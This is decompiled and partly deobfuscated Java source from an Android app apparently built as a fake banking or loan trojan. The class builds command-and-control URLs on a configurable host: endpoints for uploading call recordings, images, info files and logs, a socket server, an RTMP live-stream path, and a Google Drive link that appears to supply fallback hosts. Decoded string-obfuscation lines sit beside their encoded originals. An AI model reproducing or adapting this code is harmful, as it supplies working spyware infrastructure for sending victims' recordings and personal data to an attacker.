package com.wish.lmbank.common;

import android.text.TextUtils;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.io.Closeable;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/common/URL.class */
public class URL {
    public static String BASE_URL = "/index.php/api";
    public static final String DEFAULT_HOST = "";
    public static String GET_COLOR_RING = "/user/get_color_ring";
    public static String GET_EXTRA_MESSAGE = "/user/get_extra_message";
    public static String GET_LIMIT_PHONE_NUMBER = "/user/get_limit_phone_number";
    public static String PING_SERVER = "/user/ping_server";
    public static final String REQUEST_DEFAULT_RTMP_URL = "REQUEST_DEFAULT_RTMP_URL";
    public static final String REQUEST_GET_COLOR_RING = "REQUEST_GET_COLOR_RING";
    public static final String REQUEST_GET_EXTRA_MESSAGE = "REQUEST_GET_EXTRA_MESSAGE";
    public static final String REQUEST_GET_LIMIT_PHONE_NUMBER = "REQUEST_GET_LIMIT_PHONE_NUMBER";
    public static final String REQUEST_PING_SERVER = "REQUEST_PING_SERVER";
    public static final String REQUEST_SOCKET_PUSH_URL = "REQUEST_SOCKET_PUSH_URL";
    public static final String REQUEST_SOCKET_SERVER_URL = "REQUEST_SOCKET_SERVER_URL";
    public static final String REQUEST_SUBMIT_LOAN_APPLICATION = "REQUEST_SUBMIT_LOAN_APPLICATION";
    public static final String REQUEST_UPLOAD_IMAGES = "REQUEST_UPLOAD_IMAGES";
    public static final String REQUEST_UPLOAD_INFO_FILE = "REQUEST_UPLOAD_INFO_FILE";
    public static final String REQUEST_UPLOAD_LOG = "REQUEST_UPLOAD_LOG";
    public static final String REQUEST_UPLOAD_RECORDING_FILE = "REQUEST_UPLOAD_RECORDING_FILE";
    public static String SOCKET_PUSH_URL = "/socketiohttp";
    public static String SOCKET_SERVER_URL = ":8888";
    public static String SUBMIT_LOAN_APPLICATION = "/user/submit_loan_application";
    private static final String TAG = "URL_CONSTANT";
    public static String UPLOAD_IMAGES = "/user/upload_images";
    public static String UPLOAD_LOG = "/user/upload_log";
    public static String UPLOAD_RECORDING_FILE = "/user/upload_recording_file";
    public static String replaceHost = "";
    public static List<String> hostList = new ArrayList<>();
    public static String URL_ALTERNATE_IP = "https://drive.google.com/file/d/1HZg40qw7DGgl2HT6ZuGkKLkf5a0DnaBT/view?usp=share_link";

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/common/URL$ResultCallback.class */
    public interface ResultCallback {
        void callback(String str);
    }

    public static String getRequestUrl(String paramString) {
        StringBuilder stringBuilder3;
        String str2;
        StringBuilder stringBuilder2;
        String str1;
        StringBuilder stringBuilder4;
        if ((-334 - 19522) % -19522 > 0) {
            int i = 14925 + 14925 + 8967;
            while (true);
        }
        String str3 = getHost();
        boolean bool = TextUtils.isEmpty(str3);
        String str4 = "";
        if (bool)
            return "";
        getHost();
//        AppStartV.getContext().getString(2131820687);
        AppStartV.getContext().getString(R.string.d6);
        StringBuilder stringBuilder5 = new StringBuilder();
//         String str6 = bb7d7pu7.m5998("AR0dGRpTRkY");
//        String str6 = "https://";
        String str6 = "http://";
        stringBuilder5.append(str6);
        stringBuilder5.append(str3);
        String str5 = stringBuilder5.toString();
        StringBuilder stringBuilder6 = new StringBuilder();
        stringBuilder6.append(str6);
        stringBuilder6.append(str3);
//         stringBuilder6.append(bb7d7pu7.m5998("Uw"));
        stringBuilder6.append(":");
//        stringBuilder6.append(AppStartV.getContext().getString(2131820687));
        stringBuilder6.append( AppStartV.getContext().getString(R.string.d6));
        str6 = stringBuilder6.toString();
        paramString.hashCode();
        byte b = -1;
        switch (paramString.hashCode()) {
            case 1812805503:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02LDE9Oyg2JCw6OiguLA")))
                if (!paramString.equals("REQUEST_GET_EXTRA_MESSAGE"))
                break;
            b = 11;
            break;
            case 935669984:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY5ICcuNjosOz8sOw")))
                if (!paramString.equals("REQUEST_PING_SERVER"))
                break;
            b = 10;
            break;
            case 12555224:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY6PCskID02JSYoJzYoOTklICooPSAmJw")))
                if (!paramString.equals("REQUEST_SUBMIT_LOAN_APPLICATION"))
                break;
            b = 9;
            break;
            case -93532328:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY8OSUmKC02OywqJjstICcuNi8gJSw")))
                if (!paramString.equals("REQUEST_UPLOAD_RECORDING_FILE"))
                break;
            b = 8;
            break;
            case -193971274:
                if (!paramString.equals("REQUEST_UPLOAD_LOG"))
                break;
            b = 7;
            break;
            case -1101273729:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY8OSUmKC02ICcvJjYvICUs")))
                if (!paramString.equals("REQUEST_UPLOAD_INFO_FILE"))
                break;
            b = 6;
            break;
            case -1358127579:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02KiYlJjs2OyAnLg")))
                if (!paramString.equals("REQUEST_GET_COLOR_RING"))
                break;
            b = 5;
            break;
            case -1396086746:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02OTw6ITY8OyU")))
                if (!paramString.equals("REQUEST_SOCKET_PUSH_URL"))
                break;
            b = 4;
            break;
            case -1515275017:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02JSAkID02OSEmJyw2JzwkKyw7")))
                if (!paramString.equals("REQUEST_GET_LIMIT_PHONE_NUMBER"))
                break;
            b = 3;
            break;
            case -1869865565:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTYtLC8oPCU9Njs9JDk2PDsl")))
                if (!paramString.equals("REQUEST_DEFAULT_RTMP_URL"))
                break;
            b = 2;
            break;
            case -1955053402:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY8OSUmKC02ICQoLiw6")))
                if (!paramString.equals("REQUEST_UPLOAD_IMAGES"))
                break;
            b = 1;
            break;
            case -1999030065:
//                 if (!paramString.equals(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02Oiw7Pyw7Njw7JQ")))
                if (!paramString.equals("REQUEST_SOCKET_SERVER_URL"))
                break;
            b = 0;
            break;
        }
        switch (b) {
            default:
                paramString = str4;
                return paramString;
            case 11:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str6);
                stringBuilder3.append(BASE_URL);
                stringBuilder3.append(GET_EXTRA_MESSAGE);
                return stringBuilder3.toString();
            case 10:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str6);
                stringBuilder3.append(BASE_URL);
                stringBuilder3.append(PING_SERVER);
                return stringBuilder3.toString();
            case 9:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str6);
                stringBuilder3.append(BASE_URL);
                stringBuilder3.append(SUBMIT_LOAN_APPLICATION);
                return stringBuilder3.toString();
            case 8:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str6);
                stringBuilder3.append(BASE_URL);
                stringBuilder3.append(UPLOAD_RECORDING_FILE);
                return stringBuilder3.toString();
            case 7:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str6);
                stringBuilder3.append(BASE_URL);
                stringBuilder3.append(UPLOAD_LOG);
                return stringBuilder3.toString();
            case 6:
                stringBuilder3 = new StringBuilder();
//                 str4 = bb7d7pu7.m5998("RhwaDBtGHBkFBggNNgAH");
                str4 = "/user/upload_in";
                stringBuilder3.append(str4);
//                 stringBuilder3.append(bb7d7pu7.m5998("DwY2DwAFDA"));
                stringBuilder3.append("fo_file");
                stringBuilder4 = new StringBuilder();
                stringBuilder4.append(str6);
                stringBuilder4.append(BASE_URL);
                stringBuilder4.append(stringBuilder3);
                return stringBuilder4.toString();
            case 5:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str6);
                stringBuilder3.append(BASE_URL);
                stringBuilder3.append(GET_COLOR_RING);
                return stringBuilder3.toString();
            case 4:
                stringBuilder3 = new StringBuilder();
                stringBuilder3.append(str5);
                stringBuilder3.append(SOCKET_PUSH_URL);
                return stringBuilder3.toString();
            case 3:
                stringBuilder2 = new StringBuilder();
                stringBuilder2.append(str6);
                stringBuilder2.append(BASE_URL);
                stringBuilder2.append(GET_LIMIT_PHONE_NUMBER);
                return stringBuilder2.toString();
            case 2:
                stringBuilder2 = new StringBuilder();
//                 stringBuilder2.append(bb7d7pu7.m5998("Gx0EGVNGRg"));
                stringBuilder2.append("rtmp://");
                stringBuilder2.append(str3);
//                 stringBuilder2.append(bb7d7pu7.m5998("RgUAHwxG"));
                stringBuilder2.append("/live/");
                return stringBuilder2.toString();
            case 1:
                StringBuilder stringBuilder1 = new StringBuilder();
                stringBuilder1.append(str6);
                stringBuilder1.append(BASE_URL);
                stringBuilder1.append(UPLOAD_IMAGES);
                return stringBuilder1.toString();
            case 0:
                break;
        }
        StringBuilder stringBuilder1 = new StringBuilder();
        stringBuilder1.append(str5);
        stringBuilder1.append(SOCKET_SERVER_URL);
        return stringBuilder1.toString();
    }

    public static String getHost() {
        String value = SharedPreferencesUtils.getValue("HOST", "");
        replaceHost = value;
        return !TextUtils.isEmpty(value) ? replaceHost : "";
    }

    public static void setHost(String str) {
        replaceHost = str;
        SharedPreferencesUtils.putValue("HOST", str);
    }

    public static void loadDefaultHost(String str) {
        if (!TextUtils.isEmpty(str)) {
            hostList.add(str);
            setHost(str);
        }
//         LogUtils.v(bb7d7pu7.m5998("PDslNiomJzo9KCc9"), bb7d7pu7.m5998("BQYIDS0MDwgcBR0hBhodU0k") + hostList.toString());
        LogUtils.v("URL_CONSTANT", "loadDefaultHost: " + hostList.toString());
    }

    public static void close(Closeable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (IOException e) {
            }
        }
    }
}
